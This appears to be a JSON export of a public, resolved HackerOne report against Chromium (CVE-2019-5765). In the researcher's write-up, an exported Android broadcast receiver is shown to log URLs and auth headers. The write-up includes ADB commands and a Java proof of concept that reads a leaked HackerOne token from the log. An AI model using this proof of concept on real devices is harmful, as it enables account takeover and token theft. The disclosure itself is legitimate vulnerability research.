{
  "id": 563870,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC81NjM4NzA=",
  "url": "https://hackerone.com/reports/563870",
  "title": "CVE-2019-5765: 1-click HackerOne account takeover on all Android devices",
  "state": "Closed",
  "substate": "resolved",
  "readable_substate": "Resolved",
  "created_at": "2019-01-16T12:46:10.000Z",
  "submitted_at": "2019-01-16T12:46:10.000Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "bagipro",
    "url": "/bagipro",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/052/239/e2ad9e8b8b6b259834c21e7aefd2f3d04ccd3d23_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 1826,
    "url": "https://hackerone.com/chromium",
    "handle": "chromium",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/nms3ru7hponso1lw30920goekd09/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/nms3ru7hponso1lw30920goekd09/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "profile": {
      "name": "Chrome",
      "twitter_handle": "googlechrome",
      "website": "http://chromium.org",
      "about": ""
    }
  },
  "has_bounty?": false,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": true,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2019-05-07T23:37:43.670Z",
  "bug_reporter_agreed_on_going_public_at": null,
  "team_member_agreed_on_going_public_at": null,
  "comments_closed?": true,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "████████████",
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [
    {
      "id": 483472,
      "file_name": "h1_token.png",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/483/472/0a66eee86f5277d0403fbd086d7730820d225106/h1_token.png?response-content-disposition=attachment%3B%20filename%3D%22h1_token.png%22%3B%20filename%2A%3DUTF-8%27%27h1_token.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ3I276FVZ%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T132212Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIBR%2Fcj4He1YNoxuqlCR8y8rqIukyINMyDPuGH4bBYx6SAiEA9rxAEFgc%2FY9ADMxq89WI%2F4YUHMXyjEPxPzJLolchOMcqsgUIdhADGgwwMTM2MTkyNzQ4NDkiDFBjNDAnQ2OT9fFEUCqPBdD%2BXXWBgaRxNEUUo6cEeoytD1eXvhIsF8BkIAolofhhkKHa%2FJ9rh00ejh6T8IepmFmzqyDA1to2vDIum2KthQ0U6K%2Fq21GMCUMZo7xXkyphPeZxTlJE8cbrBa9V7531H4caFbz7tu71hUjruj7poNeDwa5J2XkqEShNg6VTkYFYqW2p508BdQAm0fm%2BJSHq3faBYzcdc%2BIdgG0f6PUjEYh8ysP11Ro09SiXv3N3T6DptjJHKSv7KUv%2FZb54m8zxj0ho7JBJGg0PnntZNlzuUrPyB5o8m6NghY%2FGYTA8AM56YwOqBpjHb6CnraAhdaDe1bVoMVPvNpaoYIcwcd4aA5uVq%2F%2BMEFbgRAsaOaZwmVbJkgiy2He0wZ1y%2Bi038Z1fvfDUbGHaWHIvakM7EmAYLWhUjnVli%2B3NqZponfkOVtoUKkcIkHv%2FMcMGpAcK0LuL5c2PBD0kic3yPmgcNitophPyXa55qvUBwb0m1aYQTwhCX70%2B1MuBBNqQvAsVUygdhbSZflPVFLVYXYCw10pZBosqrbt33MeOhLAD8A8FNaf8XnRxoIDh3nC1b6UKs2zWAsQPsE7gNEmhUsXIocoqXYlZh%2FQZSSdnGUabitNEws3%2FzTErmpCZuC2pr4nC5OCy4AoCpAKYzhiaBnVjXyi1NhUFfB7kXutS3csu0Lk3ScNHi9nlMRK%2FSHZ%2BmmfQUxKvkUG6N76Rrx09p1D%2Brasm6BwCfo%2FSw7hRWxvXSZbCwxc3do9Mpm9IRFA7fgftyitVAMxs%2B8%2FYuoPx7yvUxg0bClyQ192xRI2lA%2B2Re%2FTICR8V2PH0zUKh00J8XQvEL4nx0dQPY1eX5ebqa0OrnmqUj5MM0BpBxhDPhte4fVZA92wwkMCtrgY6sQESsP34nDSGQ6%2FMJpkkUSZiwSB%2F4jJvcrOQGDnz8fYink0yrV9jUVthg%2F0T80d3eDYEK8OVRR2nDjVCUQg3IxtCiugMaPpFUdgVHqXf%2FGpaDapO5M8KW58NB4nk4LoOYgrk9ZTwWMl3jVREWlQWgRKb1D2x8jgp12%2B72xMOnvcfsjT5bTR2OBDEBsh2BamCCdP1z2L0lwJwCGwomgMutcDqcL1aIj%2F%2Fac5TUFnKnI3315E%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=a1bc9d488979982d517ad007c3c059ae1a41ce856679f56e00966eab8e10fdbc",
      "file_size": 14517,
      "type": "image/png",
      "moderated": null
    }
  ],
  "allow_singular_disclosure_at": null,
  "vote_count": 374,
  "voters": [
    "ermilov",
    "kiyell",
    "n1m0",
    "datph4m",
    "p1stachios",
    "cdl",
    "mzfr",
    "mashoud1122",
    "sheikhrishad0",
    "holyfield",
    "and 364 more..."
  ],
  "structured_scope": null,
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "id": 15674,
      "category": "researcher",
      "content": "Hi, this is a story about a technically very simple bug that allowed to dump history from all Chromium embedders (Chromium-based browsers and WebView users). It was disclosed yesterday by the Chromium team, that’s why I can now publish details about it.\n\nIn December 2018 I suddenly found a bug in Chromium Android core when participated in the Samsung bug bounty program and looked for bugs in Samsung Browser. I discovered a publicly registered broadcast receiver (actually there are tons of them in apps from HackerOne scope, but I don’t disclose them due to low impact) in the file  https://github.com/chromium/chromium/blob/2d57e5b/content/public/android/java/src/org/chromium/content/browser/TracingControllerAndroidImpl.java#L300. It activated a profiler (logger of all requests) when received a broadcast with action ``` %app_package%.GPU_PROFILER_START ```. Then I tried to reproduce it in Chrome Browser and it worked!\n1. Sent a broadcast from ADB: ``` adb shell am broadcast -a com.android.chrome.GPU_PROFILER_START ```\n2. Loaded a page in Chrome\n3. Stopped the profiler ``` adb shell am broadcast -a com.android.chrome.GPU_PROFILER_STOP ```\n\nI expected to see a useless ``` .hprof ``` file, but when opened I found all URLs and request headers (except cookies) logged here. Then I retried to do the same in the PayPal app, and the bug worked too. It appeared that the profiler was registered automatically in all apps.\n\nSince HackerOne uses OAuth for authorization, its users could be under attack too. I think the attack complexity was pretty low using Android Instant Apps, they are activated by default on recent Androids (to observe the behavior, just google ``` vimeo video ``` and click on a video, the Vimeo app is launched automatically even if you don’t have it installed on your device).\n\nPoC to abuse a HackerOne account\n```java\n// activates the profiler in Chrome browser\nsendBroadcast(new Intent(\"com.android.chrome.GPU_PROFILER_START\"));\n\n// opens a page in Chrome, logs will be written automatically\nstartActivity(new Intent(Intent.ACTION_VIEW, Uri.parse(\"https://hackerone.com/hacker_dashboard/my_programs\")));\n\n// stops the profiler, delay is 2s to let the page load\nnew Handler().postDelayed(() -> sendBroadcast(new Intent(\"com.android.chrome.GPU_PROFILER_STOP\")), 2000);\n```\n\nAnd now you can read the log file (by default it’s written to ``` /sdcard/ ```, but you can control the output path by supplying ``` -e file /any/path ```) and theft leaked HackerOne token\n{F483472}",
      "user": {
        "id": 52239,
        "username": "bagipro",
        "name": "Sergey Toshin",
        "bio": "",
        "cleared": false,
        "verified": false,
        "website": "https://oversecured.com/",
        "location": "",
        "created_at": "2016-01-21T22:43:16.784Z",
        "url": "https://hackerone.com/bagipro",
        "hackerone_triager": false,
        "hackerone_employee": false,
        "user_type": "hacker",
        "profile_picture_urls": {
          "small": "https://profile-photos.hackerone-user-content.com/variants/000/052/239/e2ad9e8b8b6b259834c21e7aefd2f3d04ccd3d23_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c",
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/052/239/e2ad9e8b8b6b259834c21e7aefd2f3d04ccd3d23_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc",
          "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/000/052/239/e2ad9e8b8b6b259834c21e7aefd2f3d04ccd3d23_original.jpg/114764ec8f01b1a3e153599212c9f011fb3b0bce3a4fdc1f9a3c551f8c94acf8"
        }
      },
      "can_view?": true,
      "can_create?": false,
      "attachments": []
    }
  ]
}
